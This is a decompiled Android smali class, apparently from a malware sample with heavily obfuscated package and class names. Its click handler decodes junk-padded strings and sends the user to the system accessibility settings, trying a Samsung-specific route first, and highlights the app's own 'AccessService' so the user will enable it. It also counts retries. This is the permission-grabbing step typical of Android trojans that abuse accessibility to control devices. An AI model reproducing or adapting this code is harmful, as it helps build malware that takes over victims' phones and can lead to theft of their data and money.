.class L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$2;
.super Ljava/lang/Object;
.source "isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;


# direct methods
.method constructor <init>(L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;)V
    .locals 0

    .line 177
    iput-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$2;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 5

    const-string p1, "krgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55"

    .line 183
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-string v1, "com.samsung.accessibilitykrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55.installed_service"

    invoke-static {v1, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->stuoxctjtdaoeuivbicuhkpiflkolbbmlmpdazwmgcmmbmmdif53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v1, 0x50800000

    .line 184
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 186
    iget-object v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$2;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    invoke-virtual {v2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v2

    if-nez v2, :cond_0

    .line 187
    new-instance v0, Landroid/content/Intent;

    const-string v2, "android.settings.krgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55ACCESSIBILITY_SETTINGS"

    invoke-static {v2, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->stuoxctjtdaoeuivbicuhkpiflkolbbmlmpdazwmgcmmbmmdif53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 189
    iget-object v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$2;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    invoke-virtual {v2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v2

    if-nez v2, :cond_0

    .line 190
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.settings.ACCESSIBILITY_SETTINGS"

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v0, "android.intent.extra.COMPONENT_NAME"

    .line 191
    new-instance v2, Landroid/content/ComponentName;

    sget-object v3, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->myctx:Landroid/content/Context;

    const-class v4, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 192
    invoke-virtual {p1, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 193
    iget-object v0, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$2;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    invoke-virtual {v0, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->startActivity(Landroid/content/Intent;)V

    return-void

    .line 197
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 198
    iget-object v2, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$2;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    invoke-virtual {v2}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/"

    .line 199
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 200
    const-class v2, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 201
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 202
    new-instance v2, Landroid/os/Bundle;

    invoke-direct {v2}, Landroid/os/Bundle;-><init>()V

    const-string v3, ":settings:frakrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55gment_args_key"

    .line 203
    invoke-static {v3, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->stuoxctjtdaoeuivbicuhkpiflkolbbmlmpdazwmgcmmbmmdif53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3, v1}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    const-string v3, ":settings:fkrgcqosbwnxdhmzmtxnqbdhqnsmmwxjswojjqugetwgagggjjgvesqubnghmzrrkkqsnacmunvgfubvshpqhjtlaxsqvznwwjywgciufunbugdiwafsacuzrqatoddyqerhwrlimdyozoegkckfntzjqgjtxrjwvagtwhnuzyrjumqvjbbbrkltwyhbytbrgvtqrurxhsdzwdaxtdunmsjbaqdglzzhpleddpaqsclxbkribfzcuobcnolcvixtahawauktxutvxblxhvpbpjkzckbrangczfwkjejmbyzpfwzwluupingejpjsstvtwwrmfafrnsqrhkhxmvvdpbtfkizmvbhqwymxjeuidcdhnzykdbruqzvyhooglyozglxaafvtnbpndmuje55ragment_args_key"

    .line 204
    invoke-static {v3, p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->stuoxctjtdaoeuivbicuhkpiflkolbbmlmpdazwmgcmmbmmdif53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string p1, ":settings:show_fragment_args"

    .line 205
    invoke-virtual {v0, p1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Bundle;)Landroid/content/Intent;

    .line 206
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$2;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    invoke-virtual {p1, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->startActivity(Landroid/content/Intent;)V

    const/4 p1, 0x0

    .line 207
    sput p1, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->Trys:I

    .line 208
    iget-object p1, p0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20$2;->this$0:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    invoke-virtual {p1}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
